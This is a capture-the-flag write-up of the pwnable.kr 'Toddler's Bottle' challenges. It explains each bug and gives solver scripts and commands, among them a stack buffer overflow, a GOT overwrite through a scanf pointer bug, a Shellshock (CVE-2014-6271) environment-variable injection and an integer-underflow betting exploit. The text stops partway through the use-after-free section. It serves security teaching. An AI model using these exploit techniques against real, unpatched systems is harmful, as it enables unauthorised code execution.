## Toddler's Bottle Challenges

### fd

*Exploit Primitive*: N/A, read source code

*Exploit Technique*: N/A

After ssh-ing into the box, we can run `ls` to see that there are three files present, a 32-bit Linux ELF executable, the source code for the executable, and a flag file.  Attempting to `cat` the flag yields a privilege error because we are a guest user.  Consequently, we need to use the executable to read the flag.  Examining the source code shows a call to `system("/bin/cat flag");` if the input buffer, read from a calculated file descriptor, is equivalent to `"LETMEWIN\n"`.  

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}
```

The trick for this is to understand that the Linux file descriptor for standard input is 0.  Since `fd` is calculated by taking the input argument minus `0x1234`, we need to use an input argument of 4660 (the equivalent value in decimal).  This allows us to pass standard input into the binary to be processed.  We can create a file with the required text, or use `echo` (which will automatically append a new line `\n` character to the end of the text).  Using `echo "LETMEWIN" | ./fd 4660` yields the flag.


### collision

*Exploit Primitive*: N/A, basic I/O

*Exploit Technique*: N/A

We are presented with a similar situation to the previous challenge, and need to use the `col` binary to read the flag.  In this case, we need to present an input of 20 bytes which will be processed and compared to `0x21DD09EC`.  The "processing" includes casting the input from a character string to an integer array.  Since an integer is four bytes, the input will parsed into five groups.  It is important to run `file` on the binary to determine endianess - in this case, the result is `ELF 32-bit LSB executable`, indicating little-endian (Least Signficant Byte).  This means that the bytes in each group will be reversed when processed as integers.  The integers are then summed into a `res` variable which is returned and compared to `0x21DD09EC`.  

```c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
        int* ip = (int*)p;
        int i;
        int res=0;
        for(i=0; i<5; i++){
                res += ip[i];
        }
        return res;
}

int main(int argc, char* argv[]){
        if(argc<2){
                printf("usage : %s [passcode]\n", argv[0]);
                return 0;
        }
        if(strlen(argv[1]) != 20){
                printf("passcode length should be 20 bytes\n");
                return 0;
        }

        if(hashcode == check_password( argv[1] )){
                system("/bin/cat flag");
                return 0;
        }
        else
                printf("wrong passcode.\n");
        return 0;
}
```

We can calculate `0x21DD09EC/5` to determine which integers to send.  The result is `113626824.8`, which means we can send `113626825` four times and `113626824` once to return `0x21DD09EC`.  Converting these values to hex yields `0x6C5CEC9` and `0x6C5CEC8`, respectively.  Again, we need to arrange in little endian format to correctly process the integers.  It is easiest to use `echo -e -n` and pipe the result to the executable given the bytes are not ASCII characters (here the `-n` flag suppresses a new line character, which is necessary otherwise we would input 21 bytes, not 20).  Running `./col $(echo -n -e "\xc8\xce\xc5\x6\xc9\xce\xc5\x6\xc9\xce\xc5\x6\xc9\xce\xc5\x6\xc9\xce\xc5\x6")` yields the flag.

### bof

*Exploit Primitive*: Buffer overflow via `gets`

*Exploit Technique*: Overwrite comparison value using overflow

For this challenge we are provided links to download a bof executable and the corresponding C source code.  Doing a quick check with `file`, `bof` is again a 32-bit little-endian ELF executable.  A quick scan of the source code shows a `gets` vulnerability in the `puts()` function. Opening the binary in gdb and diassembling `func()` provides the binary's assembly code: 

```gdb
gdb-peda$ disass func
Dump of assembler code for function func:
   0x5655562c <+0>:     push   ebp
   0x5655562d <+1>:     mov    ebp,esp
   0x5655562f <+3>:     sub    esp,0x48
   0x56555632 <+6>:     mov    eax,gs:0x14
   0x56555638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
   0x5655563b <+15>:    xor    eax,eax
   0x5655563d <+17>:    mov    DWORD PTR [esp],0x5655578c
   0x56555644 <+24>:    call   0xf7e38420 <puts>
   0x56555649 <+29>:    lea    eax,[ebp-0x2c]
   0x5655564c <+32>:    mov    DWORD PTR [esp],eax
   0x5655564f <+35>:    call   0xf7e37940 <gets>
   0x56555654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5655565b <+47>:    jne    0x5655566b <func+63>
   0x5655565d <+49>:    mov    DWORD PTR [esp],0x5655579b
   0x56555664 <+56>:    call   0xf7e0d000 <system>
   0x56555669 <+61>:    jmp    0x56555677 <func+75>
   0x5655566b <+63>:    mov    DWORD PTR [esp],0x565557a3
   0x56555672 <+70>:    call   0xf7e38420 <puts>
   0x56555677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x5655567a <+78>:    xor    eax,DWORD PTR gs:0x14
   0x56555681 <+85>:    je     0x56555688 <func+92>
   0x56555683 <+87>:    call   0xf7edba20 <__stack_chk_fail>
   0x56555688 <+92>:    leave  
   0x56555689 <+93>:    ret  
```

This again shows there is no bound checking on the input; the binary will store the input buffer at `[esp]` which is equal to `[ebp - 0x2c]`.  Note also that a stack canary is used but not checked before running the system call.  Access to the system call requires passing the check: `cmp    DWORD PTR [ebp+0x8],0xcafebabe`.  Thus, a simple buffer overflow storing `0xcafebabe` at `ebp+0x8` is sufficient to get a shell (for full code, see `bof_solver.py`):

```python
def main(arguments):
    check = 0xcafebabe
    p = binary_connect(arguments)
    p.send(b'A'* 0x2c + b'B' * 8 + p32(check) + b'\n')
    p.interactive()
```

### flag

*Exploit Primitive*: N/A, recognizing a packed binary

*Exploit Technique*: N/A

This challenge is a simple reversing challenge that presents a standalone binary to examine. Downloading and running the `flag` binary prints out the following prompt: `I will malloc() and strcpy the flag there. take it.`  Seems simple enough, but attempting to disassemble the binary with `objdump` yields the following: 

```bash
$ objdump -d flag

flag:     file format elf64-x86-64
```

That's interesting.  Opening in a diassembler like Binary Ninja also shows a number of function calls, but no `main` entry point.  While the file is correctly identified as an ELF executable, something is still wrong.  Taking a look at the file's hex output shows the following: 
![flag_hex](https://raw.githubusercontent.com/comed-ian/CTF-Writeups/main/pwnable.kr/toddlers_bottle/_images/flag.png)

Note the `UPX!` bytes, which indicate that this file is compressed using the [upx packer](https://upx.github.io/).  Installing and running upx on the file generates a much more familiar output: 

```bash
$ upx -d flag -o flag1
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2018
UPX 3.95        Markus Oberhumer, Laszlo Molnar & John Reiser   Aug 26th 2018

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    883745 <-    335288   37.94%   linux/amd64   flag1

Unpacked 1 file.
$ objdump -d -M intel flag1 | grep "<main>:" -A 15
0000000000401164 <main>:
  401164:       55                      push   rbp
  401165:       48 89 e5                mov    rbp,rsp
  401168:       48 83 ec 10             sub    rsp,0x10
  40116c:       bf 58 66 49 00          mov    edi,0x496658
  401171:       e8 0a 0f 00 00          call   402080 <_IO_puts>
  401176:       bf 64 00 00 00          mov    edi,0x64
  40117b:       e8 50 88 00 00          call   4099d0 <__libc_malloc>
  401180:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  401184:       48 8b 15 e5 0e 2c 00    mov    rdx,QWORD PTR [rip+0x2c0ee5]        # 6c2070 <flag>
  40118b:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  40118f:       48 89 d6                mov    rsi,rdx
  401192:       48 89 c7                mov    rdi,rax
  401195:       e8 86 f1 ff ff          call   400320 <.plt+0x10>
  40119a:       b8 00 00 00 00          mov    eax,0x0
  40119f:       c9                      leave
```

Here we see that the flag is loaded into rdx and is stored at address 0x6c2070.  Opening the binary in Binary Ninja shows that the pointer at this location points to the string at address 0x496628, which can be viewed to find the flag stored in plaintext.  

### passcode

*Exploit Primitive*: `scanf` with incorrect parameter

*Exploit Technique*: overwrite address via pointer manipulation

This binary appears to have some `scanf` vulnerabilities, hinted at by the comments in the source code.  Running `clang passcode.c -o passcode` illuminates this hint with `clang`'s warning flags: 

```bash
passcode.c:9:14: warning: format specifies type 'int *' but the argument has type 'int' [-Wformat]
        scanf("%d", passcode1);
               ~~   ^``````~~
passcode.c:14:21: warning: format specifies type 'int *' but the argument has type 'int' [-Wformat]
        scanf("%d", passcode2);
```

The key to this vulnerability is that the `passcode` values are stored as integers on the stack within the `login` function. `scanf` will attempt to store user input at the memory address pointed to by the stack values.  Running the program in gdb shows that `passcode1` attemps to store the value at an address in glibc, which does not have write privileges: 

```gdb 
[-------------------------------------code-------------------------------------]
   0x804857c <login+24>:        mov    edx,DWORD PTR [ebp-0x10]
   0x804857f <login+27>:        mov    DWORD PTR [esp+0x4],edx
   0x8048583 <login+31>:        mov    DWORD PTR [esp],eax
=> 0x8048586 <login+34>:        call   0x80484a0 <__isoc99_scanf@plt>
   0x804858b <login+39>:        mov    eax,ds:0x804a02c
[------------------------------------stack-------------------------------------]
0000| 0xfff2b6f0 --> 0x8048783 --> 0x65006425 ('%d')
0004| 0xfff2b6f4 --> 0xf7631cab (<puts+11>:     add    ebx,0x152355)
```

This will cause a segmentation fault when executed.  However, some simple testing shows that the username queried prior to `login` can be used to alter some stack values, which are later retrieved during the `login` function.  The `welcome` function accepts a full 100 characters using `scanf` and stores the input in a 100 character stack buffer.  This has an off-by-one error, as `scanf` accepts the full 100 characters and then adds a trailing null byte.  This is perfect for our uses, since the final four bytes of username input coincide with the stack address where `passcode1` is eventually stored.  This gives us control to change the pointer where the `passcode1` input will be stored with the username input.  We want to control execution flow to call the instructions after the credential checks in `login`, and a great target to hijack execution is using the GOT address for `fflush`, since it is called immediately after `passcode1` is retrieved.  We can retrieve the GOT address using pwntools and send it in as the last four bytes of our username.  Then, we overwrite this GOT address with the address of the validated login instructions.  Note that this address should be passed in as a string of integers, since `scanf` expects a string input of decimal numbers.  The following short script accomplishes this goal and gains elevated privileges to cat the flag.

```python
from pwn import *

def exploit():
        p = process('/home/passcode/passcode')
        e = ELF('/home/passcode/passcode')
        fflush_got_addr = e.got['fflush']
        login_addr = 0x80485d7
        print (hex(fflush_got_addr), login_addr)
        p.send(b"A" * 96 + p32(fflush_got_addr) + str(login_addr))
        print(p.recv)

        p.interactive()

if __name__ == "__main__":
        context.log_level = 'debug'
        exploit()
```

### random 

*Exploit Primitive*: `rand()` without `srand` seed

*Exploit Technique*: predict result of `rand()` and reverse required input

This challenge includes a binary that attempts to implement the C library's `random` function. However, the key flaw is that the `random()` call is not first seeded, meaning that the random value generated will be the same each run.  Opening in gdb and setting a breakpoint after the call shows that the value is always equal to 0x6b8b4567.  Since the xor operation is reversible, simply calculating `0x6b8b4567 ^ 0xdeadbeef` yields the valid input `3039230856`.  Passing this value into the binary successfully elevates privileges and cats the flag.  

### input 

*Exploit Primitive*: N/A, understanding of Linux I/O

*Exploit Technique*: N/A

This challenge is less about pwning / reversing and more about interacting with binaries.  The binary requires that we interact with it in five specific ways:
* First, we need to open the process with 100 arguments (including the argument for the executable itself).  This is most easily done by creating a list and using pwntool's `process` module to open the binary with the listed arguments.  Furthermore, we need to make sure that the 'A'th (aka 41st) and 'B'th (aka 42nd) argument in the list adhere to the binary's requirement of `\x00` and `\x20\x0a\x0d`.  
* Second, we need to send the binary data, which is receives on two different file descriptors.  The first is the `stdin` descriptor, which is the default used by pwntools's `process.send()` function.  The second is `fd=2`, which is `stderr`.  We can load this file descriptor by first creating a pipe using `os.pipe()` and mapping the input of the pipe to `stderr=` in the process's creation.  This will allow us to use `os.write(fd, data)` to write to the `stderr` file descriptor.  
* Third, we need to set environment variables to specific values. This is easy using Python's `os.environ()` function.  
* Fourth, the binary opens a file `\x0a` and compares its data to a predetermined string.  To create a file we need to be in the `/tmp` directory, since the `/home` directories do not have write privileges.  Simply opening, writing to, and closing the file is sufficient to pass this check
* Finally, the binary takes the 'C'th (aka 43rd) argument and uses that as a port to listen on for communication.  We can choose a random high number port value (to avoid conflicts) and create a socket using Python `socket` library.  Connecting to `localhost` and sending the required data passes the test

This is all sufficient to pass the five requirements, however we are at an impasse; the binary tries to cat `./flag`, however the flag file does not reside in `/tmp`. We cannot `cp` the flag file because we do not have read permissions in `/home/`, nor can we run the script from `/home` because we cannot create the required `\x0a` file in the `/home` directory.  The solution is to create a symlink between a local `flag` file and the actual flag file in `/home/input2`.  The command `ln -sf /home/input2/flag flag` accomplishes this goal and achieves escalated privileges. 

```python
from pwn import *
import sys
import socket

port = 19564
r, w = os.pipe()
def stage1():
        argv1 = ['/home/input2/input']
        for i in range(0,99):
                if (i == ord('A') - 1):
                        argv1.append('\x00')
                elif (i == ord('B') - 1):
                        argv1.append("\x20\x0a\x0d")
                elif (i == ord('C') - 1):
                        argv1.append(str(port)) # set up port for Stage 5
                else:
                        argv1.append(str(i))
        p = process(argv=argv1,stderr=r) # set up stderr for Stage 2
        os.close(r)
        return p

def stage2(p):
        p.send("\x00\x0a\x00\xff")
        os.write(w,b"\x00\x0a\x02\xff")

def stage3():
        os.environ["\xde\xad\xbe\xef"] = "\xca\xfe\xba\xbe"
        assert(os.getenv("\xde\xad\xbe\xef") == "\xca\xfe\xba\xbe")

def stage4():
        f = open("\x0a", 'w')
        f.write('\x00\x00\x00\x00')
        f.close()

def stage5():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('127.0.0.1', port))
        s.send("\xde\xad\xbe\xef")
        s.close()

def exploit():
        # set environment variables and file first, otherwise the binray will race (and beat) script
        stage3()
        stage4()
        p = stage1() # open process with correct argv values
        stage2(p) # send correct values via stdout and stderr
        stage5()
        p.interactive()


if __name__ == "__main__":
        exploit()
```

### leg

*Exploit Primitive*: N/A, reversing ARM instructions

*Exploit Technique*: N/A

This is our first ARM challenge, and primarly tests a couple unique features of ARM assembly.  We are provided with both the source code file and the associated disassembly, which allows us to solve this challenge with just static analysis.  The program is simple: it calls three functions, adds their return values, and prints the flag if the sum is equivalent to the user provided input.  While tempting to simply consider the inline assembly in the source code, the key is to investigate the ARM disassembly to understand the return values.  

`Key1()` is a simple function and displays some of the uniqueness of ARM.  Register 11 (`r11`) is roughly analogous to `ebp` in x86 as it stores the return base pointer address when `bl`, branch and link, is called.  This allows functions to call other functions and return to their function stack prior to branching.  The other key difference here is the use of the `pc` register (sometimes referred to as `r15`).  This register operates like the program counter (or `eip`) in x86, *however it always points two full instructions ahead of the current instruction*.  We will see why in the analysis of the next function.  This means the instruction `mov	r3, pc` actually moves `current instruction value + 2 * 4`, where four is the number of bytes of each ARM instruction.  This means the actual value stored into `r3` and then returned to the calling function via `r0` (similar to how `eax` returns a function value) is `0x00008ce4`.

```gdb
   0x00008cd4 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cd8 <+4>:	add	r11, sp, #0
   0x00008cdc <+8>:	mov	r3, pc
   0x00008ce0 <+12>:	mov	r0, r3
   0x00008ce4 <+16>:	sub	sp, r11, #0
   0x00008ce8 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008cec <+24>:	bx	lr
```

`Key2()` adds additional ARM functionality using the `bx` instruction. `bx` is a branching instruction like `b`, however it also performs a check to see if the processor should switch to ARM's "thumb" mode.  Thumb mode is a more efficient processing mode in which instructions are shorter (two bytes instead of four).  The way a programmer enters thumb mode is to set the least significant bit of an instruction address (which will not affect the instruction itself, as it is either 16- or 32-bit aligned by ARM standards).  Thus, two back-to-back instructions such as `add	r6, pc, #1` and `bx	r6` will effectively jump to the next expected instruction (the instruction after `bx	r6`) in thumb mode.  We see that in this function, and thumb mode begins at address `0x00008d04`.  In this case, when we perform the operation `mov	r3, pc`, we do not add `2 * 4` as we did in the previous function, as thumb mode instructions are only 2 bytes long.  Therefore, we add `2 * 2` to the current instruction's address, or `0x00008d08`.  The next instruction then adds four to this value, making the return value `0x00008d0c`.

```gdb 
   0x00008cf0 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cf4 <+4>:	add	r11, sp, #0
   0x00008cf8 <+8>:	push	{r6}		; (str r6, [sp, #-4]!)
   0x00008cfc <+12>:	add	r6, pc, #1
   0x00008d00 <+16>:	bx	r6
   0x00008d04 <+20>:	mov	r3, pc
   0x00008d06 <+22>:	adds	r3, #4
   0x00008d08 <+24>:	push	{r3}
   0x00008d0a <+26>:	pop	{pc}
   0x00008d0c <+28>:	pop	{r6}		; (ldr r6, [sp], #4)
   0x00008d10 <+32>:	mov	r0, r3
   0x00008d14 <+36>:	sub	sp, r11, #0
   0x00008d18 <+40>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d1c <+44>:	bx	lr
```~

`Key3()` adds a final new feature which is the `lr` register.  The `lr` register is analogous to the return `eip` stored on the stack during function calls, and allows functions to call other functions and then resume execution on the subsequent instruction.  Here we take the value of `lr` and store it into `r3` which is then returned to the `main` function.  Since the instruction immediately follwing `Key3()` is `0x00008d80` in `main()`, this is the return value for the function.  

```gdb 
   0x00008d20 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008d24 <+4>:	add	r11, sp, #0
   0x00008d28 <+8>:	mov	r3, lr
   0x00008d2c <+12>:	mov	r0, r3
   0x00008d30 <+16>:	sub	sp, r11, #0
   0x00008d34 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d38 <+24>:	bx	lr
```
Validating the equivalence comparison means inputting the value equal to the three return sums. Since `scanf("%d", &key);` will convert the value to an integer, we need to input the string value of the sums, or `0x00008ce4 + 0x00008d0c + 0x00008d80 = 108400`.  

### mistake

*Exploit Primitive*: Logic error in unary operator precedence

*Exploit Technique*: Leverage control of `stdin` to control read password value

This program is relatively simple to understand once the bug is found.  It is clear that there is a mistake in the program based on the program name and prompt.  Identifying the bug can be done by either reviewing the source code, or by executing the binary and observing its behavior.  Running the program results in the process hanging, as if it is waiting for user input.  This is unexpected, as the program seemingly begins by reading the flag file and then prompting the user for input.  Because the prompt does not appear until after some user input is given, our preliminary understanding of the program is incorrect.  

A quick search for the hint `operator priority` or compiling the source code with a rigorous compiler like `clang` gives hints as to what the issue is.  ![This guide](https://www.tutorialspoint.com/cprogramming/c_operators_precedence.htm) shows that the relational operators `< <= > >=` are given higher precedence (operated upon prior to) the assignment operator `=`.  This means the first line in `main()`, `if(fd=open("./password",O_RDONLY,0400) < 0)`, will first compare the return value (`fd`) returned by `open()` to 0.  Since the file is opened and returned a `fd`, the comparison will return a False (`0`) value.  This means that the `fd=` assignment will store `0` as the file descriptor later used to load `pw_buf`.  The subsequent command `read(fd,pw_buf,PW_LEN)` will effectively read data from file descriptor `0` (stdin) as the password.  This means we control both the password and the user input which is xor-d and compared to the password.  We can choose easy values for the two inputs, such as `BBBBBBBBBB` and `CCCCCCCCCC`, since B (0x41) xor 0x1 is C (0x42).  This passes the check and returns the flag.

### shellshock 

*Exploit Primitive*: CVE-2014-6271

*Exploit Technique*: Command injection using bash

This challenge presents a very simple C script long with a lengthy bash ELF binary that executes bash commands. The source code for `shellshock.c` is pretty sparse - it sets UID and GID values and then calls `/home/shellshock/bash -c echo shock_me`. The output for this script is, unsprisingly, `shock_me`. 

The key to this challenge is that the bash binary is vulnerable to a CVE, specifically CVE-2014-6271.  Per NIST:

> “GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables"

This means that exporting an environment variable that defines a function can allow for arbitrary code exuection. For example, the following bash commands: 

```bash
export val='() { blahhh; }; echo hi'
./shellshock
```

Returns the following output: 

```bash
hi
shock_me
```

In the export, `val` and `blah` can be changed to any text string; the vulnerability is only dependent on the fact that a function is correctly defined.  Therefore, changing the export to `export val='() { blahhh; }; cat flag'` dumps the flag before seg-faulting.

### coin1

*Exploit Primitive*: N/A, binary search programming

*Exploit Technique*: N/A

This is not an exploitation challenge but rather a programming challenge. The program allows a certain number of guesses as to which specific index of `n` coins is fake.  The number of guesses is not arbitrary, it is always greater than or equal to the `log_2(n)`.  This allows us to write a brief binary search program that weighs the first half of the `n` coins to determine if the fake coin is in that half.  The search then continues in the half that is confirmed to hold the fake coin. The most difficult part of this challenge is handling a sometimes quirky I/O interface, which occassionally requires the user to input the fake coin two times in a row once it is identified with a weight of nine.  The following code performs the binary search and iterates over subsequent challenges when the first problem is solved: 

```python
def exploit(): 
  def get_result():
    resp = p.recvline()
    if resp[0:8] == b"Correct!":
      return 1
    return resp

  def get_results(start, mid):
    resp = p.recvline()
    if resp[:8] == b"Correct!":
      print(resp)
      return 9
    w = int(resp.strip())
    if w == 9:
      p.send(str(start).encode("utf-8") + b'\n')
      resp = p.recvline()
      while(resp[0:8] != b"Correct!"):
        p.send(str(start).encode("utf-8") + b'\n')
        resp = p.recvline()
      print(resp)
      return 9
    if w < (mid - start) * 10:
      return 1
    else:
      return 0

  def solve(n, c):
    # pause()
    start = 0
    end = n
    mid = n // 2
    while True:
      query = b""
      for num in range(start, mid):
        query += str(num).encode("utf-8") + b" "
      query = query[:-1] + b'\n'
      p.send(query)
      res = get_results(start, mid)
      if res == 9:
        break
      if res == 1:
        end = mid
        mid = (end-start) // 2 + start
      else:
        start = mid
        mid = (end - start) // 2 + start
        if mid == start: # handle last edge case
          mid += 1
          
  # exploit starts here 
  p = binary_connect()
  p.recvuntil("3 sec... -\n\t\n")
  time.sleep(3.5)
  while True:
    line = p.recvline().decode("utf-8")
    try:
      n = int(line.split(" ")[0].split("=")[1])
      c = int(line.split(" ")[1].split("=")[1])
    except:
      print(line)
    solve(n, c)
```

Note that the flag is returned when 100 challenges are solved.  There are some instances where the connection speed external to the pwnable server causes enough lag that fewer than 100 challenges are solved.  Running again was sufficient to return the flag.

### blackjack

*Exploit Primitive*: Integer underflow

*Exploit Technique*: Underflow cash amount when a bet is lost

This challenge has a simple vulnerability, but a larger code base that can be used to confuse and deviate the challenger.  One issue that initially led me awry is an incorrect use of `srand((unsigned) time(NULL));`.  This is used to seed the `rand` function, but is done so every time a new number is generated.  The resulting problem is that the seed is identical within the same one second interval.  This then returns deterministic cards within that interval. While this is an error that can potentially be exploited, there is a much worse error in the program.  

The source code shows that the `bet` value is a signed integer and no lower bound check is implemented.  Furthermore, the `cash` amount is determined through simple addition and subtraction of the `bet` depending on the outcome.  This means we can bet an arbitrary large negative value (within the bounds of an `int` data type) and intentionally lose to build our `cash` to $1M.  The following code performs this task and retrieves the flag after intentionally losing.  *Note: this exploit only fails if we happen to land on 21, which is rather unlikely.*

```python
def exploit():
  def make_bet():
    p.recvuntil(b"Enter Bet: $")
    p.send(b"-10000000\n")

  def get_cash():
    cash = p.recvline().strip().split(b" $")[1]
    print("Cash: " + cash.decode("utf-8"))
    return int(cash.decode("utf-8"))

  def get_total():
    p.recvuntil(b"Your Total is ")
    total = p.recvline().strip()
    print("Total: " + total.decode("utf-8"))
    return int(total.decode("utf-8"))

  def get_dealer():
    p.recvuntil(b"The Dealer Has a Total of ")
    dealer = p.recvline().strip() 
    print("Dealer: " + dealer.decode("utf-8"))
    return int(dealer.decode("utf-8"))

  def hit_or_stay(decision):
    p.recvuntil(b"Hit or S to Stay.\n")
    if decision == "hit":
      p.send(b"H\n")
    else: 
      p.send(b"S\n")

  def wait():
    t = datetime.datetime.utcnow()
    sleeptime = (t.second + t.microsecond/1000000.) % 1 + .2
    print("waiting " + str(sleeptime) + " seconds")
    time.sleep(sleeptime)

  def start_hand():
    p.recvline()
    get_cash()
    total = get_total()
    dealer = get_dealer()
    make_bet()
    while True:
      hit_or_stay("hit")
      my_total = get_total()
      dealer_total = get_dealer()
      if my_total >= 21 or dealer_total >= 21:
        break
      
    p.recvuntil(b"Please Enter Y for Yes or N for No\n")
    p.send(b'Y\n')

  # exploit starts here
  p = binary_connect()
  p.recvuntil(b"Y/N)\n")
  p.recv()
  p.send(b"Y")
  p.recvuntil(b"Choice: ")
  p.send(b"1\n")
  start_hand()
  print(p.recvline())
```

### memcpy

This challenges provides source code for `memcpy.c`, which implements a byte-by-byte "slow" memcpy and a asm-based "fast" memcpy. It asks us to choose different copy sizes, and if the program runs to completion it prints the flag. The issue is that the server appears to crash before the end of the script. 

Compiling the code ourselves with `gcc memcpy.c -o memcpy -m32 -lm`, we can see the error message and trace the crash. For example, the first crash when using the minimum values for each chunk (as shown below) occurs in `fast_memcpy()`

```bash
input: 
8
16
32
64
128
256
512
1024
2048
4096
```

As shown below, the crash occurs when trying to assign the copy to `[edx]` which is a heap address `0x804d0a8`. 

```gdb
(gdb) disass
   0x080487b3 <+27>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080487b6 <+30>:	mov    edx,DWORD PTR [ebp+0x8]
   0x080487b9 <+33>:	movdqa xmm0,XMMWORD PTR [eax]
   0x080487bd <+37>:	movdqa xmm1,XMMWORD PTR [eax+0x10]
   0x080487c2 <+42>:	movdqa xmm2,XMMWORD PTR [eax+0x20]
   0x080487c7 <+47>:	movdqa xmm3,XMMWORD PTR [eax+0x30]
=> 0x080487cc <+52>:	movntps XMMWORD PTR [edx],xmm0

(gdb) i r
eax            0xf7fca000	-134438912
ecx            0xf7fd3f80	-134398080
edx            0x804d0a8	134533288
ebx            0x0	0
esp            0xffffdb68	0xffffdb68
ebp            0xffffdb78	0xffffdb78
esi            0xf7f6c000	-134823936
edi            0xf7f6c000	-134823936
```

Digging into the [movntps assembly instruction](https://www.felixcloutier.com/x86/movntps), it states: 

> The memory operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version) or 64-byte (EVEX.512 encoded version) boundary otherwise a general-protection exception (#GP) will be generated

As we can see, the destination `edx` register is not 16-byte aligned, but rather 8-byte aligned. What is interesting is that the crash occurs in the **128** allocation, **but this is due to the prior (64 byte) allocation**. These destinations are on the heap, and all of these allocations are small enough to be cached. That means the allocations are sequential and therefore the allocated address is influenced by the prior size. 

Heap chunks assigned by `malloc(size_t size)` allocate a chunk that is **size + 8** bytes (for 32-bit programs), where the additional 8 bytes maintain chunk metadata. As shown below, the 64-byte (0x40) allocation actually creates a 0x48 size chunk (where the chunk size is actually 0x49 due to the logical OR with heap flags). This means the next allocation header begins at 0x804d0a0, and the chunk data therefore starts at 0x804d0a0 + 8 = 0x804d0a8. This is clearly not 0x10 byte aligned, and therefore the 128-byte memcpy fails. 



```gdb
0x804d050:	                        0x00000000	0x00000000	0x00000000	0x00000049 < total chunk size (incl header) | FLAGS
0x804d060: 64 alloc begins here >   0x00000000	0x00000000	0x00000000	0x00000000
0x804d070:	                        0x00000000	0x00000000	0x00000000	0x00000000
0x804d080:	                        0x00000000	0x00000000	0x00000000	0x00000000
0x804d090:	                        0x00000000	0x00000000	0x00000000	0x00000000
0x804d0a0:	                        0x00000000	0x00000089	0x00000000  < 128 alloc begins here
```

However, if we increase the size of the prior allocation to, say, 72 (0x48), the next header begins at 0x804d0a8 and therefore the chunk data starts at 0x804d0a8 + 8 = 0x804d0b0, which **is** aligned:

```gdb
0x804d050:	                        0x00000000	0x00000000	0x00000000	0x00000051
0x804d060: 72 alloc begins here >   0x00000000	0x00000000	0x00000000	0x00000000
0x804d070:                        	0x00000000	0x00000000	0x00000000	0x00000000
0x804d080:                        	0x00000000	0x00000000	0x00000000	0x00000000
0x804d090:                        	0x00000000	0x00000000	0x00000000	0x00000000
0x804d0a0:                        	0x00000000	0x00000000	0x00000000	0x00000089
0x804d0b0: 128 alloc begins here >  0x00000000	0x00000000	0x00000000	0x00000000
```

Note that this `fast_memcpy` error does not apply for sizes smaller than 0x40, because it simply calls `slow_memcpy` for anything smaller than that size. Therefore, we simply need to increase every chunk between 64 and 4096 (no adjustment is needed for the final chunk, since there is nothing to follow it) by 8 bytes to force all subsequent chunks to be 0x10-byte aligned. 

```bash
8     -> slow_memcpy
16    -> slow_memcpy
32    -> slow_memcpy
64    -> 0x48 allocation -> change to 72 -> 0x50 allocation
128   -> 0x88 allocation -> change to 132 -> 0x90 allocation
256   -> 0x108 allocation -> change to 264 -> 0x110 allocation
512   -> 0x208 allocation -> change to 520 -> 0x210 allocation
1024  -> 0x408 allocation -> change to 1032 -> 0x410 allocation
2048  -> 0x808 allocation -> change to 2056 -> 0x810 allocation 
4096  -> 0x1008 allocation -> ok (last allocation) 
```

This input succeeds and the program prints the flag at completion.

### uaf 

*Exploit Primitive*: Use after free (UAF)

*Exploit Technique*: Pointer corruption on the heap, triggered by UAF

This is the first heap challenge, and it introduces a basic Use After Free vulnerability in a C++ executable.  The key to this challenge is understanding how C++ uses inheritance and constructors to create the `man` and `woman` classes.  The data is split into two areas: the vtables which contain constructor and member function addresses, and the heap which stores relevant data to each object.  An example of each is shown below.  

```
vtables
0x401540 <_ZTV5Woman>:	    0x0000000000000000	0x00000000004015b0  < woman vtable (constructor, give shell, introduce)
0x401550 <_ZTV5Woman+16>:	  0x000000000040117a	0x0000000000401376
0x401560 <_ZTV3Man>:	      0x0000000000000000	0x00000000004015d0  < man vtable (constructor, give shell, introduce)
0x401570 <_ZTV3Man+16>:	    0x000000000040117a	0x00000000004012d2
0x401580 <_ZTV5Human>:	    0x0000000000000000	0x00000000004015f0  < human vtable (constructor, give shell, introduce)
0x401590 <_ZTV5Human+16>:	  0x000000000040117a	0x0000000000401192

Heap 
0x18ddc10:	0x0000000000000000	0x0000000000000031 < Human header
0x18ddc20:	0x0000000000000004	0x0000000000000004
0x18ddc30:	0x0000000000000000	0x000000006b63614a < name 
0x18ddc40:	0x0000000000000000	0x0000000000000021 < man header
0x18ddc50:	0x0000000000401570	0x0000000000000019 < man vtable / age
0x18ddc60:	0x00000000018ddc38	0x0000000000000031 < link to name / Human header
0x18ddc70:	0x0000000000000004	0x0000000000000004
0x18ddc80:	0x0000000000000001	0x000000006c6c694a < name
0x18ddc90:	0x0000000000000000	0x0000000000000021 < woman header
0x18ddca0:	0x0000000000401550	0x0000000000000015 < woman vtable / age
0x18ddcb0:	0x00000000018ddc88	0x0000000000020351 < link to name / top chunk header
```

